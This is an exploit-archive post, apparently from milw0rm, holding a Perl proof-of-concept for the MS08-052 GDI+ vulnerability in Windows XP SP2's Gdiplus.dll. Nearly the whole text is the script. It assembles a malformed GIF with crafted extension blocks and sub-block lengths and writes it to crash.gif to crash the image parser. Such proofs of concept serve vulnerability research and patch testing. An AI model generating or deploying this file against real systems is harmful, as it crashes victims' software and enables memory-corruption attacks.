------------------------------------------------------------------------------------------------------------
Operating System: XP SP2
Gdiplus.dll Version: 5.1.3102.2180

Credit:

John Smith,
Evil Fingers

GIF Template Reference: http://www.sweetscape.com/010editor/templates/files/GIFTemplate.bt

PoC Link: http://www.evilfingers.com/patchTuesday/MS08_052_GDI+_Vulnerability_ver2.txt

http://www.evilfingers.com/patchTuesday/PoC.php 
============================================================================================================

#!/usr/bin/perl
#
use strict;

my $gif = 

"\x47\x49\x46\x38\x39\x61". # GIF header
"\x65\x00\x65\x00\xF7\x0B\x0B". # Logical Screen Descriptor
# COLOR Stream
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33". 
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33".
"\x21". ## Extension Introducer 0x21
"\x2C". ## Label 0x2C
# Data Sub-blocks (1)  Size: 21+1
#0
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#1
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\x2C\x21\xEC".
"\x21\xEC".
#2
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#3
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#4
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\x2C\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#5
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#6
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#7
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\x2C\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#8
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#9
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#10
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\x2C\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC".
#11
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC".
"\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x21\xEC\x2C\x00\x00\x00\x00\x0E".
"\x01\x5A".
"\x00". ## Terminator
"\x21". ## Extension Introducer 0x21
"\x2C". ## Label 0x2C
# Data Sub-blocks (2) Size: EC+1
#0
"\xEC\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62".
#1
"\xEC\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62".
#2
"\xEC\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62".
#3
"\xEC\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62".
#4
"\xEC\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61".
"\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62\x61\x62".
"\x00". # Terminator
"\x3B". # Trailer

open(out, "> crash.gif");
binmode(out);
print (out $gif);
close(out);

# milw0rm.com [2008-10-09]